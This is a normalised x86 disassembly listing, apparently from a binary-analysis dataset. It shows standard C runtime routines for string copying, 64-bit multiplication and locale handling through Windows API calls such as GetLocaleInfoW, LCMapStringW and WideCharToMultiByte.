je r-xdata
push 0xc
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_414238
push ebx
call sub_414054
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rwxdata
push [ ebp + 0xc ]
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_419147
jmp r-xdata
test [ rwxdata ] 0x1
jne r-xdata
mov [ rwxdata ] edi
push [ edi ]
push rwxdata
call sub_414238
pop ecx
pop ecx
mov eax [ rwxdata ]
mov ecx [ eax + 0xbc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rwxdata ] ecx
mov eax [ eax + 0xac ]
mov [ rwxdata ] eax
sub_419180
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4191b4
call sub_411ce2
test eax eax
je r-xdata
test [ rwxdata ] 0x2
je r-xdata
push 0x16
call sub_411f41
pop ecx
push 0x3
call sub_40ce79
int3
push 0x1
push 0x40000015
push 0x3
call sub_40e564
add esp 0xc
sub_4191e7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rwxdata ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rwxdata ] ecx
pop ebp
retn
sub_419208
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
sub_4192d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40b955
pop ecx
sub_4192f3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4192d3
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_40b9ce
pop ecx
cmp eax esi
je r-xdata
call sub_41ef10
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_4193cd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4192f3
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_419407
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
pop ebp
retn
sub_419443
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_419698
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_419700
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
sub_41975f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_41977d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_4192d3
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_40b9ce
pop ecx
cmp eax ebx
je r-xdata
call sub_41ef10
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_4192d3
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_40b9ce
pop ecx
cmp eax ebx
je r-xdata
call sub_41ef10
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_419964
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41977d
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4199aa
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4105f0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4192d3
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40b9ce
pop ecx
cmp eax ebx
je r-xdata
call sub_41ef10
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_419a91
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4199aa
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_419ad1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_4121e3
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_4121e3
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_4121e3
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_4121e3
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_41a2d0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40b955
push [ esi + 0x8 ]
call sub_40b955
push [ esi + 0xc ]
call sub_40b955
push [ esi + 0x10 ]
call sub_40b955
push [ esi + 0x14 ]
call sub_40b955
push [ esi + 0x18 ]
call sub_40b955
push [ esi ]
call sub_40b955
push [ esi + 0x20 ]
call sub_40b955
push [ esi + 0x24 ]
call sub_40b955
push [ esi + 0x28 ]
call sub_40b955
